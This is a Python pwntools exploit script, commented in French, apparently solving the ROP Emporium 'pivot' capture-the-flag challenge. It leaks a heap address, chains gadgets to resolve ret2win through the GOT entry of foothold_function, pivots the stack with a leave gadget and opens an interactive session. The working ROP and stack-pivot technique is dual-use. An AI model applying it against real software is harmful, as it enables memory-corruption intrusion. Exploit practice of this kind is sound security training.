#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time
import sys

# Version with call rax 

gs='''
b *pwnme+180
c
'''
# Offset avant ecrasement de l'adresse de RBP
offset=0x20

# Set up pwntools for the correct architecture
elf =  ELF('pivot')
context.binary=elf

useless_func=elf.symbols['uselessFunction']
got_foothold=elf.got['foothold_function']
plt_foothold=elf.plt['foothold_function']
pwnme=elf.symbols['pwnme']

# References ELF de la librairie
libelf = ELF('libpivot.so')

# Calcul de la distance entre ret2win et foothold_function
lib_foothold = libelf.symbols['foothold_function']
lib_ret2win = libelf.symbols['ret2win']
off_ret2win=lib_ret2win-lib_foothold

# Gadgets
g_leave = pwnme+181
g_poprax=0x04009bb
g_poprbp=0x0400808
g_addrax=0x04009c4
g_callrax=0x04006b0
g_movraxrax=0x04009c0

io = process([elf.path])
if len(sys.argv)>1 and sys.argv[1] == "-d":
    gdb.attach(io,gs)
    time.sleep(1)
    #io = gdb.debug([elf.path],gdbscript=gs)


io.recvuntil(b"to pivot:")
leak = io.recvline().rstrip()
print(leak)
leak = int(leak,16)
log.info(f"{leak=:x}")

# Message 1
# Version lecture de la GOT puis call vers ret2win
PL=p64(plt_foothold)
PL+=p64(g_poprax)
PL+=p64(got_foothold)
PL+=p64(g_movraxrax)
PL+=p64(g_poprbp)
PL+=p64(off_ret2win)
PL+=p64(g_addrax)
PL+=p64(g_callrax)


io.sendlineafter(b"> ",PL)

# Message 2 : pivot
PL =b"A"*offset
PL+=p64(leak-8)
PL+=p64(g_leave)
io.sendlineafter(b"> ",PL)

io.interactive()

